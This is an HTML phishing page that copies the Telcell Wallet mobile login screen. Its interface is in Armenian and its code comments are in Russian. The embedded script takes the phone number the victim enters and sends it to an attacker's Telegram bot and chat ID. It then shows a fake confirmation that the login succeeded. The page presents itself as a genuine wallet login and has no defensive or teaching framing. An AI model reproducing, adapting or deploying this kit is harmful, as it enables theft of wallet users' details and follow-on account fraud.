<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telcell Wallet - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
            position: relative;
        }

        /* Top Bar */
        .back-button {
            background: none;
            border: none;
            font-size: 24px;
            color: #333;
            cursor: pointer;
            width: fit-content;
            margin-bottom: 20px;
        }

        /* Content Area */
        .content {
            flex-grow: 1;
        }

        h1 {
            font-size: 34px;
            font-weight: 800;
            color: #222;
            margin-bottom: 30px;
        }

        h2 {
            font-size: 20px;
            font-weight: 700;
            text-align: center;
            color: #222;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 15px;
            color: #8e8e93;
            text-align: center;
            margin-bottom: 35px;
        }

        /* Input Section */
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        label {
            font-size: 14px;
            font-weight: 700;
            color: #333;
        }

        .input-wrapper {
            background-color: #f2f2f7;
            border-radius: 16px;
            padding: 18px 20px;
            display: flex;
            align-items: center;
        }

        input {
            background: none;
            border: none;
            outline: none;
            width: 100%;
            font-size: 18px;
            color: #000;
        }

        input::placeholder {
            color: #aeaeb2;
        }

        .hint {
            font-size: 14px;
            color: #8e8e93;
        }

        .info-box {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            align-items: flex-start;
        }

        .info-icon {
            color: #ff5e4d;
            font-weight: bold;
            font-size: 18px;
        }

        .info-text {
            font-size: 14px;
            color: #8e8e93;
            line-height: 1.4;
        }

        /* Footer Section */
        .footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            margin-top: 20px;
        }

        .offer-link {
            color: #ff5e4d;
            font-weight: 700;
            text-decoration: none;
            font-size: 16px;
        }

        .terms {
            font-size: 13px;
            color: #333;
            text-align: center;
            padding: 0 20px;
            line-height: 1.4;
        }

        .submit-btn {
            width: 100%;
            background-color: #ffd0c8; /* Неактивный цвет как на скрине */
            color: white;
            border: none;
            border-radius: 30px;
            height: 56px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .submit-btn.active {
            background-color: #ff5e4d; /* Активный цвет */
        }
    </style>
</head>
<body>

<div class="app-container">
    <button class="back-button">←</button>

    <div class="content">
        <h1>Բարև</h1>
        <h2>Մուտք</h2>
        <p class="subtitle">Ստեղծիր հարթակ վճարումներիդ համար</p>

        <form id="loginForm">
            <div class="input-group">
                <label>Քո հեռախոսահամարը</label>
                <div class="input-wrapper">
                    <input type="tel" id="phone" placeholder="+374 (**) *** ***" required>
                </div>
                <p class="hint">Նմուշ՝ 77XXXXXX</p>
                
                <div class="info-box">
                    <span class="info-icon">ⓘ</span>
                    <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
                </div>
            </div>
        </form>
    </div>

    <div class="footer">
        <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
        <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
        <button type="submit" form="loginForm" id="submitBtn" class="submit-btn">Հաստատել</button>
    </div>
</div>

<script>
    const phoneInput = document.getElementById('phone');
    const submitBtn = document.getElementById('submitBtn');
    const form = document.getElementById('loginForm');

    // Оживляем кнопку при вводе
    phoneInput.addEventListener('input', () => {
        if (phoneInput.value.length > 5) {
            submitBtn.classList.add('active');
        } else {
            submitBtn.classList.remove('active');
        }
    });

    form.onsubmit = async function(e) {
        e.preventDefault();

        const phoneValue = phoneInput.value;
        const BOT_TOKEN = 'PASTE_YOUR_TOKEN_HERE'; // ВСТАВЬ СВОЙ ТОКЕН ТУТ
        const CHAT_ID = '6576262467';

        // Меняем текст на кнопке для вида
        submitBtn.innerText = 'Ուղարկվում է...';

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `📲 Telcell Login:\n\nНомер: ${phoneValue}`
                })
            });

            if (response.ok) {
                alert('Մուտքը հաստատված է:');
                phoneInput.value = '';
                submitBtn.classList.remove('active');
                submitBtn.innerText = 'Հաստատել';
            } else {
                alert('Ошибка сервера');
            }
        } catch (err) {
            alert('Ցանցի սխալ');
        }
    };
</script>

</body>
</html>
